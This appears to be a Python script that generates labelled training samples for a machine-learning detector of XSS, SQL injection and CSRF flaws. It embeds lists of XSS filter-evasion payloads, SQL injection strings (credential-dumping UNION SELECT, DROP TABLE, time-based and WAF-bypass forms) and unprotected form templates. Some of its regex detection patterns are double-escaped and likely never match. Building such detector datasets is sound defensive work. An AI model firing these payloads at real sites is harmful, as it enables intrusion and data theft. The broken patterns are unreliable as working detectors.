#!/usr/bin/env python3
import os
import json
import random
import string
import traceback
import html as html_module
from bs4 import BeautifulSoup
import re
import sys
from urllib.parse import urlparse, parse_qs # Added for SQLi features

ML_DEBUG = True # Added this line to define ML_DEBUG locally

def generate_random_string(length=10):
    """Generate a random string of given length"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_xss_samples(num_samples=100):
    """Generate XSS training samples with diverse payloads and contexts"""
    samples = []

    # Expanded XSS payloads (examples, can be much larger)
    # Sources: OWASP XSS Filter Evasion Cheat Sheet, PortSwigger XSS Cheat Sheet, etc.
    xss_payloads = [
        # Basic
        '<script>alert(1)</script>',
        '<ScRipT>alert(1)</sCRipT>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<a href="javascript:alert(1)">click me</a>',
        '<div onmouseover="alert(1)">hover me</div>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',

        # HTML context breaking
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</noscript><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '</iframe><script>alert(1)</script>',

        # Attributes
        '<img src="x" onerror="alert(1)">',
        '<img src=javascript:alert(1)>',
        '<img src=`javascript:alert(1)`>',
        '<img src=\\"x\\" onerror=\\"alert(1)\\">', # Escaped quotes
        '<div style="background:url(javascript:alert(1))">',
        '<div style="width: expression(alert(1));">', # IE specific

        # Event Handlers (various tags)
        '<button onclick="alert(1)">Click</button>',
        '<details open ontoggle="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<input onblur="alert(1)" autofocus>',
        '<form onsubmit="alert(1); return false;"><input type=submit></form>',
        '<select onchange="alert(1)"><option>1</option></select>',
        '<textarea onkeyup="alert(1)"></textarea>',
        '<body onpageshow="alert(1)">', # Requires navigation

        # JavaScript href
        '<a href="JaVaScRiPt:alert(1)">click</a>',
        '<a href="\\tjavascript:alert(1)">click</a>', # Tab
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>', # HTML entities

        # Obfuscation & Encoding
        '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" onload="alert(1)">', # data URI
        '<script src="data:text/javascript,alert(1)"></script>',
        '<script>eval(\'al\'+\'ert(1)\')</script>',
        '<script>window[\\\'al\\\'+\\\'ert\\\'](1)</script>',
        '<script>setTimeout(\'alert(1)\',0)</script>',
        '<script>constructor.constructor("alert(1)")()</script>',

        # DOM XSS specific (might need more context for features)
        '#"><img src=x onerror=alert(1)>', # Fragment-based
        '<script>document.write(location.hash.substring(1))</script>', # Example sink for fragment
        '<script>eval(location.hash.substring(1))</script>',

        # Polyglots
        '"><svg/onload=alert(1)//',
        'javascript:"/*`/*-->`<svg/onload=alert(1)>`*/',
        '-->\'"><img src=x onerror=alert(1)>'
    ]

    # Define injection contexts
    # {PAYLOAD} is where the XSS payload goes
    # {SAFE_TEXT} is for non-vulnerable, escaped text
    # {RANDOM_ID} for unique element IDs
    # {RANDOM_TEXT} for generic random text
    html_contexts = [
        # 1. Reflected in HTML body
        lambda p, s, r_id, r_txt: f"<html><head><title>Search</title></head><body><div>Search results for: {p}</div><p>{r_txt}</p></body></html>",
        # 2. In HTML attribute (unquoted)
        lambda p, s, r_id, r_txt: f"<html><body><img src=x alt={p}><p>{r_txt}</p></body></html>",
        # 3. In HTML attribute (single-quoted)
        lambda p, s, r_id, r_txt: f"<html><body><a href='http://example.com?param={p}' title='{r_txt}'>Link</a></body></html>",
        # 4. In HTML attribute (double-quoted)
        lambda p, s, r_id, r_txt: f'<html><body><input type="text" name="query" value="{p}" id="{r_id}"></body></html>',
        # 5. Inside a <script> tag (string context)
        lambda p, s, r_id, r_txt: f"<html><head><script>var userInput = \"{p}\"; console.log(userInput);</script></head><body>{r_txt}</body></html>",
        # 6. Inside a <textarea>
        lambda p, s, r_id, r_txt: f"<html><body><textarea id='{r_id}'>{p}</textarea><p>{r_txt}</p></body></html>",
        # 7. Inside <title>
        lambda p, s, r_id, r_txt: f"<html><head><title>{p}</title></head><body>{r_txt}</body></html>",
        # 8. Inside an HTML comment (misconfiguration)
        lambda p, s, r_id, r_txt: f"<html><body><!-- User comment: {p} --><div>{r_txt}</div></body></html>",
        # 9. JavaScript eval-like sink
        lambda p, s, r_id, r_txt: f"<html><script>setTimeout(\"{p}\"); console.log('{r_txt}');</script></html>",
        # 10. JavaScript innerHTML sink
        lambda p, s, r_id, r_txt: f"<html><body><div id='{r_id}'></div><script>document.getElementById('{r_id}').innerHTML = \"{p}\";</script><p>{r_txt}</p></body></html>",
        # 11. JavaScript document.write sink
        lambda p, s, r_id, r_txt: f"<html><script>document.write(\"<div>{p}</div>\"); /* {r_txt} */</script></html>",
        # 12. CSS style attribute
        lambda p, s, r_id, r_txt: f"<html><div style=\"width:100px; {p}\" id=\"{r_id}\">{r_txt}</div></html>",
        # 13. Complex page with forms and scripts
        lambda p, s, r_id, r_txt: f"""
        <html><head><title>{r_txt} Page</title><meta charset="utf-8">
        <script src="jquery.js"></script><link rel="stylesheet" href="style.css"></head>
        <body><h1>{r_txt}</h1><form action="/submit"><input type="text" name="q" value="{p}" id="{r_id}">
        <input type="submit" value="Search"></form>
        <div id="results_{r_id}"></div>
        <script>
            function display(val) {{ document.getElementById('results_{r_id}').innerText = 'Result: ' + val; }}
            var data = "{s if s else 'default_value'}"; // Safe string for non-vulnerable
            // Potentially vulnerable if p is used directly in a sink later
            console.log("User input: {p}");
        </script></body></html>"""
    ]

    def generate_sample_html(is_vulnerable):
        raw_payload_text = random.choice(xss_payloads) if is_vulnerable else ""
        # If vulnerable, p gets the raw payload. If not, p gets an escaped random string.
        # safe_text_for_payload_slot is used when we need a guaranteed safe string for other parts of the template.
        p_val = raw_payload_text if is_vulnerable else html_module.escape(generate_random_string(20))
        safe_text_for_template = html_module.escape(generate_random_string(20))
        
        random_id = "el_" + generate_random_string(5)
        random_text_content = generate_random_string(30)
        
        chosen_context_func = random.choice(html_contexts)
        
        html_content = chosen_context_func(p_val, safe_text_for_template, random_id, random_text_content)
        
        # The URL might also contain the raw payload for some types of reflection
        # For consistency in URL generation, we use the raw payload if vulnerable, or the p_val (escaped random) if not.
        url_param_content = raw_payload_text if is_vulnerable else p_val 
        url = f"http://example.com/page?param={html_module.escape(url_param_content)}" # Always escape URL param for safety in this example URL
        
        return html_content, url, raw_payload_text # Return raw_payload_text

    # Helper function for advanced XSS feature extraction
    def extract_xss_features(html_string, soup, raw_payload_text):
        features = [0] * 40
        features[0] = len(html_string)
        features[1] = len(re.findall(r'<input', html_string, re.IGNORECASE))
        features[2] = len(re.findall(r'<form', html_string, re.IGNORECASE))
        features[5] = len(soup.find_all('iframe'))
        features[6] = len(soup.find_all('a', href=True))
        features[7] = len(soup.find_all('meta'))
        features[8] = len(soup.find_all('link'))

        event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout', 'onkeyup', 'onkeydown', 'onsubmit', 'onchange', 'onfocus']
        for i, handler in enumerate(event_handlers):
            features[10 + i] = len(re.findall(rf'{handler}', html_string, re.IGNORECASE))

        # Corrected js_patterns list using regular Python strings with explicit escapes
        js_patterns = [
            'eval[.(]',                    # Regex: eval[.(]
            'setTimeout[.(]',              # Regex: setTimeout[.(]
            'setInterval[.(]',             # Regex: setInterval[.(]
            'document[.]write[.(]',         # Regex: document[.]write[.(]
            '\\.innerHTML',                # Python string: \\.innerHTML -> Regex: \.innerHTML
            '\\.outerHTML',                # Python string: \\.outerHTML -> Regex: \.outerHTML
            '\\.insertAdjacentHTML',       # Python string: \\.insertAdjacentHTML -> Regex: \.insertAdjacentHTML
            '\\.execScript',               # Python string: \\.execScript -> Regex: \.execScript
            'new\\s+Function',             # Python string: new\\s+Function -> Regex: new\\s+Function
            r'window\x5b'                   # Raw string: r'window\x5b' -> Regex: window[
        ]
        for i, pattern in enumerate(js_patterns):
            try:
                features[20 + i] = len(re.findall(pattern, html_string, re.IGNORECASE))
            except re.error as e:
                # This will print if a specific pattern in js_patterns fails to compile
                # Useful if the main script error is somehow masking which pattern is the true culprit
                print(f"[ERROR] regex compilation/execution failed for pattern: '{pattern}'. Error: {e}", file=sys.stderr)
                features[20 + i] = 0 # Assign a default value or handle error appropriately

        dom_patterns = [
            r'document\\.createElement', r'document\\.appendChild', r'document\\.replaceChild',
            r'document\\.getElementById', r'document\\.querySelector', r'\\.setAttribute',
            r'\\.getAttribute', r'\\.removeAttribute', r'\\.dataset', r'\\.style'
        ]
        for i, pattern in enumerate(dom_patterns):
            features[30 + i] = len(re.findall(pattern, html_string, re.IGNORECASE))

        dangerous_js_sinks = ['eval(', 'document.write(', '.innerHTML', '.outerHTML', '.insertAdjacentHTML', 'setTimeout(', 'setInterval(', 'alert(']
        is_vulnerable_sample = bool(raw_payload_text)

        score_js_uri = 0
        for tag in soup.find_all(['a', 'iframe', 'img', 'form', 'object', 'embed', 'script']):
            for attr_name in ['href', 'src', 'action', 'data']:
                attr_value = tag.get(attr_name, '').lower()
                if attr_value.startswith('javascript:'):
                    score_js_uri += 1
                    if is_vulnerable_sample and raw_payload_text.lower() in attr_value:
                        score_js_uri += 2
                    for sink in dangerous_js_sinks:
                        if sink in attr_value:
                            score_js_uri += 1
        features[3] = score_js_uri

        score_script = 0
        for script_tag in soup.find_all('script'):
            script_content = script_tag.string if script_tag.string else ''
            script_src = script_tag.get('src', '')
            if is_vulnerable_sample and raw_payload_text.lower() in script_content.lower():
                score_script += 2
            for sink in dangerous_js_sinks:
                if sink.lower() in script_content.lower():
                    score_script += 1
            if script_src:
                script_src_lower = script_src.lower()
                if script_src_lower.startswith('javascript:') or script_src_lower.startswith('data:'):
                    score_script += 1
                    if is_vulnerable_sample and raw_payload_text.lower() in script_src_lower:
                        score_script += 2
                    for sink in dangerous_js_sinks:
                        if sink.lower() in script_src_lower:
                            score_script +=1
        features[4] = score_script
        
        score_event_handler = 0
        for tag in soup.find_all(True):
            for attr_name, attr_value in tag.attrs.items():
                if attr_name.lower().startswith('on'):
                    score_event_handler += 0.5
                    attr_value_lower = attr_value.lower()
                    if is_vulnerable_sample and raw_payload_text.lower() in attr_value_lower:
                        score_event_handler += 2
                    for sink in dangerous_js_sinks:
                        if sink.lower() in attr_value_lower:
                            score_event_handler += 1
        features[9] = int(score_event_handler)

        return features

    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        html, url, raw_payload = generate_sample_html(is_vulnerable=True)
        soup = BeautifulSoup(html, 'html.parser')
        features = extract_xss_features(html, soup, raw_payload)
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True,
            'raw_payload': raw_payload
        })
    
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        html, url, raw_payload = generate_sample_html(is_vulnerable=False)
        soup = BeautifulSoup(html, 'html.parser')
        features = extract_xss_features(html, soup, raw_payload)
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False,
            'raw_payload': raw_payload
        })
    
    return samples

# Helper function for advanced SQLi feature extraction
def extract_sqli_features(url, html_string, soup, raw_sqli_payload):
    features = [0] * 42  # Initialize for 42 features

    # Basic HTML/URL properties
    features[0] = len(html_string)
    features[1] = len(url)

    # URL Analysis
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    features[2] = int(';' in url)  # url_has_semicolon
    features[3] = int(re.search(r'%27|%23|%2F\\*', url, re.IGNORECASE) is not None)  # url_has_encoded_comment_or_quote (%2F* for /*)
    features[4] = int(re.search(r'(--|#|/\*)', url) is not None)  # url_has_sql_comment
    features[5] = int(re.search(r'(sleep|benchmark|pg_sleep|waitfor\\s+delay)', url, re.IGNORECASE) is not None)  # url_has_time_based_keyword
    features[6] = int(re.search(r'(and\\s+\\d+=\\d+|or\\s+\\d+=\\d+|=)', url, re.IGNORECASE) is not None)  # url_has_boolean_logic (added =)
    features[7] = int("'" in url or '"' in url)  # url_has_quote
    found_concat = re.search(r'concat\x28', url, re.IGNORECASE)
    found_concat_ws = re.search(r'concat_ws\x28', url, re.IGNORECASE)
    found_group_concat = re.search(r'group_concat\x28', url, re.IGNORECASE)
    features[8] = int(bool(found_concat or found_concat_ws or found_group_concat))
    features[9] = int(bool(re.search(r'information_schema', url, re.I)))  # url_has_info_schema
    features[10] = int(bool(re.search(r'(sys\\.tables|sys\\.objects|all_tables|user_tables)', url, re.I)))  # url_has_db_tables_keyword
    features[11] = int(bool(re.search(r'(case\\s+when|decode\\())', url, re.I)))  # url_has_control_flow_keyword

    # SQL Keywords in URL
    sql_keywords_url = [
        r'select\\b', r'union\\b', r'insert\\b', r'update\\b', r'delete\\b',
        r'order\\s+by\\b', r'group\\s+by\\b', r'having\\b', r'limit\\b'
    ]
    for i, keyword_pattern in enumerate(sql_keywords_url):
        features[12 + i] = int(bool(re.search(keyword_pattern, url, re.IGNORECASE)))
    # features[12] = url_has_keyword_select
    # features[13] = url_has_keyword_union
    # ...
    # features[20] = url_has_keyword_limit

    # SQL Keywords in HTML
    features[21] = int(bool(re.search(r'\\bselect\\b', html_string, re.I))) # html_has_keyword_select
    features[22] = int(bool(re.search(r'\\bunion\\b', html_string, re.I)))  # html_has_keyword_union

    # Error Messages in HTML
    error_pattern = r'(sql\\s+syntax|unknown\\s+column|unclosed\\s+quotation|unterminated\\s+string|ora-\\d+|psql:|syntax\\s+error\\s+at\\s+or\\s+near|Microsoft OLE DB Provider|MariaDB server version for the right syntax|Warning: include|failed to open stream)'
    features[23] = int(bool(re.search(error_pattern, html_string, re.IGNORECASE))) # html_has_common_sql_error (added LFI like errors for broader check)

    # Encoding in URL
    features[24] = int(bool(re.search(r'(%20|\\+)', url)))  # url_has_space_encoding
    features[25] = int(bool(re.search(r'%[0-9a-fA-F]{2}', url))) # url_has_hex_encoding (general)

    # Parameter Analysis
    features[26] = len(query_params) # num_url_params
    suspicious_param_names = ['id', 'item', 'prod', 'user', 'name', 'cat', 'category', 'search', 'query', 'q', 'p', 'file', 'page', 'dir', 'view', 'document', 'param', 'val']
    features[27] = int(any(p_name.lower() in suspicious_param_names for p_name in query_params.keys())) # url_param_name_suspicious
    
    param_value_long = False
    param_value_has_payload_chars = False
    if query_params:
        for values_list in query_params.values():
            for val_str in values_list:
                if len(val_str) > 50: # Arbitrary length for "long"
                    param_value_long = True
                if re.search(r"['\"()#;=]|--|/\\*", val_str): # Common SQLi characters
                    param_value_has_payload_chars = True
                if param_value_long and param_value_has_payload_chars: break
            if param_value_long and param_value_has_payload_chars: break
    features[28] = int(param_value_long) # url_param_value_long
    features[29] = int(param_value_has_payload_chars) # url_param_value_has_payload_chars

    # Payload presence in HTML contexts (only if raw_sqli_payload is provided)
    if raw_sqli_payload:
        payload_lower = raw_sqli_payload.lower()
        features[30] = int(bool(soup.find('input', value=lambda v: v and payload_lower in v.lower())))
        features[31] = int(bool(any(payload_lower in (s.string.lower() if s.string else '') for s in soup.find_all('script'))))
        features[32] = int(bool(soup.find('a', href=lambda h: h and payload_lower in h.lower())))
        features[33] = int(bool(any(payload_lower in (t.get_text().lower() if t.get_text() else '') for t in soup.find_all(['div', 'p', 'span', 'td', 'li', 'h1', 'h2', 'h3', 'pre', 'code']))))
    # features[30] = payload_in_form_input_value
    # features[31] = payload_in_script_tag_content
    # features[32] = payload_in_href
    # features[33] = payload_in_generic_tag_content

    # Counts
    features[34] = url.count("'")  # count_single_quotes_url
    features[35] = url.count('"')  # count_double_quotes_url
    features[36] = len(re.findall(r'(--|#|/\*)', url)) # count_sql_comments_url
    features[37] = url.count('(') # count_opening_parens_url
    features[38] = url.count(')') # count_closing_parens_url
    
    # General HTML flags
    features[39] = int(bool(re.search(r'waf|firewall|blocked|captcha|forbidden|access denied', html_string, re.I))) # html_has_waf_or_permission_message
    features[40] = int(bool(re.search(r'json.*error', html_string, re.I))) # html_has_json_error
    features[41] = int(bool(re.search(r'(<form|<input|<textarea)', html_string, re.I))) # html_has_form_elements
    
    return features

def generate_sqli_samples(num_samples=100):
    """Generate SQL injection training samples with advanced features"""
    samples = []
    sqli_payloads = [
        "' OR '1'='1", "1' OR '1'='1' --", "' UNION SELECT username,password FROM users --", "admin' --", "' OR 1=1; DROP TABLE users --",
        "1; SELECT * FROM information_schema.tables --", "' OR '1'='1' LIMIT 1 --", "1' ORDER BY 1--", "1' GROUP BY 1--", "' HAVING 1=1 --",
        # Encoded
        "%27%20OR%20%271%27%3D%271", "%27%20AND%20SLEEP%285%29--", "%27%20UNION%20SELECT%20NULL--",
        # Stack queries
        "1; SELECT SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
        # NoSQLi (though features are mostly relational SQL focused)
        '{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(5000)"}',
        # WAF bypass attempts
        "' /*!50000OR*/ '1'='1", "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3--",
        # Real bug bounty/CTF like
        "' OR 1=1-- -", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;--", "' OR 1=1;#", "' OR 1=1;/*",
        " UNION SELECT @@VERSION, SLEEP(5), NULL-- ",
        " AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        " IF(1=1,SLEEP(5),0)"
    ]
    
    common_param_names_for_payload = ["id", "user", "name", "search", "category", "file", "page", "dir", "view", "query", "p", "prod"]

    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        raw_payload = random.choice(sqli_payloads)
        param_name = random.choice(common_param_names_for_payload)
        
        # Construct URL - payload might be URL encoded sometimes
        url_encoded_payload = html_module.escape(raw_payload) # Basic escaping for URL context
        if random.random() < 0.3: # Sometimes use raw, sometimes encoded for variety
            url_param_val = raw_payload
        else:
            url_param_val = url_encoded_payload

        url = f"http://example.com/search?{param_name}={url_param_val}&timestamp={generate_random_string(5)}"
        
        # HTML reflects payload in various ways
        html_content = f"""
        <html><head><title>Search Results for {html_module.escape(raw_payload[:20])}</title></head><body>
        <h1>Query: {html_module.escape(raw_payload)}</h1>
        <div class='error'>MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '{html_module.escape(raw_payload[:30])}' at line 1</div>
        <div class='debug_query'>SELECT * FROM products WHERE {param_name} = '{raw_payload}' AND published = 1;</div>
        <form action='/search'>
            <input type='text' name='{param_name}' value='{html_module.escape(raw_payload)}'>
            <input type='submit' value='Search'>
        </form>
        <script>var userQuery = '{html_module.escape(raw_payload)}'; console.log(userQuery);</script>
        <a href='/search?{param_name}={url_encoded_payload}'>Vulnerable Link</a>
        <div class="user-data">User provided: <pre>{html_module.escape(raw_payload)}</pre></div>
        <!-- User Agent: sqlmap/1.5 -->
        <!-- Cookie: session_id=abc; user_pref={url_encoded_payload} -->
        </body></html>
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        features = extract_sqli_features(url, html_content, soup, raw_payload)
        samples.append({'url': url, 'html': html_content, 'features': features, 'is_vulnerable': True})

    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        param_name = random.choice(common_param_names_for_payload)
        safe_value = generate_random_string(random.randint(5,15))
        url = f"http://example.com/search?{param_name}={safe_value}&timestamp={generate_random_string(5)}"
        html_content = f"""
        <html><head><title>Search Results for {safe_value}</title></head><body>
        <h1>Query: {safe_value}</h1>
        <div>Displaying results for term: {safe_value}</div>
        <form action='/search'>
            <input type='text' name='{param_name}' value='{safe_value}'>
            <input type='submit' value='Search'>
        </form>
        <script>var userQuery = '{safe_value}'; console.log(userQuery);</script>
        <a href='/search?{param_name}={safe_value}'>Safe Link</a>
        </body></html>
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        features = extract_sqli_features(url, html_content, soup, "") # Pass empty string for raw_sqli_payload
        samples.append({'url': url, 'html': html_content, 'features': features, 'is_vulnerable': False})
    
    return samples

def generate_csrf_samples(num_samples=100):
    """Generate CSRF training samples"""
    samples = []
    
    # Создаем различные варианты уязвимых форм (без защиты от CSRF)
    vulnerable_form_templates = [
        # Базовая форма без защиты CSRF
        lambda: f"""
        <html>
        <head>
            <title>Update Profile</title>
            <link rel="stylesheet" href="styles.css">
        </head>
        <body>
            <h1>Update Your Profile</h1>
            <div class="profile-form">
                <form method="post" action="/update_profile">
                    <div class="form-group">
                        <label for="name">Name:</label>
                        <input type="text" id="name" name="name" value="John Doe">
                    </div>
                    <div class="form-group">
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" value="john@example.com">
                    </div>
                    <div class="form-group">
                        <label for="bio">Bio:</label>
                        <textarea id="bio" name="bio">Web developer with 5 years of experience.</textarea>
                    </div>
                    <div class="form-group">
                        <input type="submit" value="Update Profile">
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Форма изменения пароля без защиты CSRF
        lambda: f"""
        <html>
        <head>
            <title>Change Password</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
            <h1>Change Your Password</h1>
            <div class="password-form">
                <form method="post" action="/change_password">
                    <div class="form-group">
                        <label for="current_password">Current Password:</label>
                        <input type="password" id="current_password" name="current_password" required>
                    </div>
                    <div class="form-group">
                        <label for="new_password">New Password:</label>
                        <input type="password" id="new_password" name="new_password" required>
                    </div>
                    <div class="form-group">
                        <label for="confirm_password">Confirm New Password:</label>
                        <input type="password" id="confirm_password" name="confirm_password" required>
                    </div>
                    <div class="form-group">
                        <button type="submit">Change Password</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Форма транзакции/платежа без защиты CSRF
        lambda: f"""
        <html>
        <head>
            <title>Transfer Funds</title>
            <link rel="stylesheet" href="/assets/css/banking.css">
        </head>
        <body>
            <h1>Transfer Funds</h1>
            <div class="transaction-form">
                <form method="post" action="/api/transfer">
                    <div class="form-group">
                        <label for="from_account">From Account:</label>
                        <select id="from_account" name="from_account">
                            <option value="12345678">Checking Account (****5678) - $3,421.50</option>
                            <option value="87654321">Savings Account (****4321) - $12,755.25</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="to_account">To Account:</label>
                        <input type="text" id="to_account" name="to_account" placeholder="Account Number">
                    </div>
                    <div class="form-group">
                        <label for="amount">Amount:</label>
                        <input type="number" id="amount" name="amount" step="0.01" min="0.01">
                    </div>
                    <div class="form-group">
                        <label for="memo">Memo:</label>
                        <input type="text" id="memo" name="memo" placeholder="Optional">
                    </div>
                    <div class="form-group">
                        <button type="submit" class="primary-button">Transfer Funds</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Форма настроек аккаунта без защиты CSRF
        lambda: f"""
        <html>
        <head>
            <title>Account Settings</title>
            <meta charset="utf-8">
        </head>
        <body>
            <h1>Account Settings</h1>
            <div class="settings-form">
                <form method="post" action="/settings/update">
                    <fieldset>
                        <legend>Notification Preferences</legend>
                        <div class="form-check">
                            <input type="checkbox" id="email_notifications" name="email_notifications" checked>
                            <label for="email_notifications">Email Notifications</label>
                        </div>
                        <div class="form-check">
                            <input type="checkbox" id="sms_notifications" name="sms_notifications">
                            <label for="sms_notifications">SMS Notifications</label>
                        </div>
                        <div class="form-check">
                            <input type="checkbox" id="browser_notifications" name="browser_notifications" checked>
                            <label for="browser_notifications">Browser Notifications</label>
                        </div>
                    </fieldset>
                    <fieldset>
                        <legend>Privacy Settings</legend>
                        <div class="form-check">
                            <input type="checkbox" id="profile_visible" name="profile_visible" checked>
                            <label for="profile_visible">Make Profile Public</label>
                        </div>
                        <div class="form-check">
                            <input type="checkbox" id="show_online_status" name="show_online_status" checked>
                            <label for="show_online_status">Show Online Status</label>
                        </div>
                    </fieldset>
                    <div class="form-group">
                        <button type="submit">Save Settings</button>
                    </div>
            </form>
            </div>
        </body>
        </html>
        """,
        
        # Форма администратора без защиты CSRF
        lambda: f"""
        <html>
        <head>
            <title>Admin Controls</title>
            <link rel="stylesheet" href="/admin/css/dashboard.css">
        </head>
        <body>
            <h1>Admin Controls</h1>
            <div class="admin-form">
                <h2>User Management</h2>
                <form method="post" action="/admin/user/update-role">
                    <div class="form-group">
                        <label for="user_id">User ID:</label>
                        <input type="text" id="user_id" name="user_id" required>
                    </div>
                    <div class="form-group">
                        <label for="new_role">New Role:</label>
                        <select id="new_role" name="new_role">
                            <option value="user">User</option>
                            <option value="moderator">Moderator</option>
                            <option value="admin">Administrator</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <button type="submit" class="admin-button">Update Role</button>
                    </div>
                </form>
                
                <h2>Site Configuration</h2>
                <form method="post" action="/admin/config/update">
                    <div class="form-group">
                        <label for="site_name">Site Name:</label>
                        <input type="text" id="site_name" name="site_name" value="Example Site">
                    </div>
                    <div class="form-group">
                        <label for="maintenance_mode">Maintenance Mode:</label>
                        <input type="checkbox" id="maintenance_mode" name="maintenance_mode">
                    </div>
                    <div class="form-group">
                        <button type="submit" class="admin-button">Save Configuration</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Форма с AJAX-отправкой но без защиты CSRF
        lambda: f"""
        <html>
        <head>
            <title>Contact Form</title>
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
            <script>
                $(document).ready(function() {{
                    $("#contact-form").submit(function(e) {{
                        e.preventDefault();
                        $.ajax({{
                            type: "POST",
                            url: "/api/contact",
                            data: $(this).serialize(),
                            success: function(response) {{
                                $("#result").html("<div class='success'>Message sent successfully!</div>");
                                $("#contact-form")[0].reset();
                            }},
                            error: function() {{
                                $("#result").html("<div class='error'>Error sending message. Please try again.</div>");
                            }}
                        }});
                    }});
                }});
            </script>
        </head>
        <body>
            <h1>Contact Us</h1>
            <div class="contact-container">
                <form id="contact-form" method="post">
                    <div class="form-group">
                        <label for="name">Name:</label>
                        <input type="text" id="name" name="name" required>
                    </div>
                    <div class="form-group">
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" required>
                    </div>
                    <div class="form-group">
                        <label for="subject">Subject:</label>
                        <input type="text" id="subject" name="subject" required>
                    </div>
                    <div class="form-group">
                        <label for="message">Message:</label>
                        <textarea id="message" name="message" rows="5" required></textarea>
                    </div>
                    <div class="form-group">
                        <button type="submit">Send Message</button>
                    </div>
                </form>
                <div id="result"></div>
            </div>
        </body>
        </html>
        """
    ]
    
    # Создаем различные типы уязвимых cookie (без атрибутов безопасности)
    vulnerable_cookie_templates = [
        {"session": "12345abcde67890", "user_id": "123"},
        {"PHPSESSID": "s3ss10n1d", "logged_in": "true"},
        {"jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},
        {"auth_token": "9876543210abcdef", "remember_me": "1"},
        {"id": "user_1234", "auth": "valid", "permissions": "user,editor"},
        {"ASP.NET_SessionId": "asp12345678", "user_info": "name=John&role=user"}
    ]
    
    # Генерация уязвимых образцов
    for _ in range(num_samples // 2):
        html_template = random.choice(vulnerable_form_templates)
        html = html_template()
        cookies = random.choice(vulnerable_cookie_templates)
        url = "http://example.com/" + random.choice(["profile", "account", "settings", "admin", "dashboard", "user", "payment"])
        
        # Извлекаем формы
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        
        # Извлекаем особенности форм
        has_csrf_token = False
        csrf_token_patterns = [
            'csrf', 'xsrf', 'token', 'nonce', 'authenticity_token', 'verify', 'security'
        ]
        
        # Проверяем скрытые поля на наличие токенов CSRF
        hidden_inputs = []
        for form in forms:
            hidden_inputs.extend(form.find_all('input', {'type': 'hidden'}))
        
        for input_field in hidden_inputs:
            field_name = input_field.get('name', '').lower()
            if any(pattern in field_name for pattern in csrf_token_patterns):
                has_csrf_token = True
                break
        
        # Проверяем заголовки на защиту от CSRF
        headers = {
            "Host": "example.com",
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Признаки уязвимости к CSRF
        features = [
            1 if not has_csrf_token else 0,  # Нет CSRF-токена (это признак уязвимости)
            len(forms),  # Количество форм
            len(hidden_inputs),  # Количество скрытых полей
            1 if any('post' == form.get('method', '').lower() for form in forms) else 0,  # Есть ли POST формы
            1 if any('action' in form.attrs for form in forms) else 0,  # Есть ли атрибуты action
            1 if any('ajax' in str(tag).lower() or 'xhr' in str(tag).lower() for tag in soup.find_all('script')) else 0,  # Использование AJAX
            1 if any('jquery' in str(tag).lower() for tag in soup.find_all('script')) else 0,  # Использование jQuery
            1 if soup.find_all('button', {'type': 'submit'}) else 0,  # Наличие кнопок отправки
            len(cookies),  # Количество куки
            1 if 'session' in str(cookies).lower() else 0,  # Сессионные куки
            1 if not any('sameSite' in k or 'secure' in k for k in cookies.keys()) else 0,  # Отсутствие защитных атрибутов
            1 if 'admin' in url.lower() or 'settings' in url.lower() else 0,  # Чувствительные URL
            len(html),  # Размер HTML
            len(url),  # Длина URL
            len(str(cookies))  # Длина куки
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'cookies': cookies,
            'headers': headers,
            'features': features,
            'is_vulnerable': True
        })
    
    # Создаем различные варианты защищенных форм
    secure_form_templates = [
        # Безопасная форма с CSRF-токеном
        lambda: f"""
        <html>
        <head>
            <title>Update Profile</title>
            <link rel="stylesheet" href="styles.css">
        </head>
        <body>
            <h1>Update Your Profile</h1>
            <div class="profile-form">
                <form method="post" action="/update_profile">
                    <input type="hidden" name="csrf_token" value="{generate_random_string(32)}">
                    <div class="form-group">
                        <label for="name">Name:</label>
